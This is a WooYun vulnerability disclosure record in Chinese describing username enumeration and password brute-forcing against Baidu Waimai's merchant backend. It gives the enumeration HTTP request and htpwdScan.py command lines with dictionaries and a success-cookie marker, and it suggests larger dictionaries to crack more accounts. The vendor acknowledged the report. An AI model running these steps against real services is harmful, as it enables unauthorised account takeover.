{"id": 25548, "wybug_id": "wooyun-2015-0112633", "wybug_title": "百度某商家后台可以暴力破解少量账号", "wybug_corp": "百度", "wybug_author": "lijiejie", "wybug_date": "2015-05-07 15:04", "wybug_open_date": "2015-06-25 11:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： 百度某商家后台可以暴力破解 详细说明：  百度外卖商家后台，可以暴力破解出少量账号\nhttp://wmcrm.baidu.com/\n首先，判断哪些用户名是不需要验证码的（同时也知道用户名已存在）：\nGET /crm?qt=getloginfailedtimes&username=xxx HTTP/1.1Host: wmcrm.baidu.comProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie:\n若用户名xxx存在，返回{\"errno\":0,\"errmsg\":\"\",\"data\":[]}用双拼字典，获取得到364个用户名：\nhtpwdScan.py -f=baidu.txt -d username=dict\\pinyin2.txt -no302 -suc=\"errno\\\":0\"\n\n\n   漏洞证明：  当密码正确登陆成功时，页面会写入一个Cookie名叫name_wmcrm，因此拿它作为成功标记：\nhtpwdScan.py -f=baidu_login.txt -d password=dict/pass.txt username=baidu.wm.users.txt -no302 -hsuc=\"name_wmcrm=\"\n用小字典，比如只破解密码为123456，可以破解出少量账号：\n\n想破解更多账号，考虑把双拼字典换成3拼字典。\n\n   修复方案：  系统整体是安全的，破解也不过很少几个账号，但建议增加 密码强度， 不可用纯数字、纯字母等   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-05-11 11:43 厂商回复： 谢交已提 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}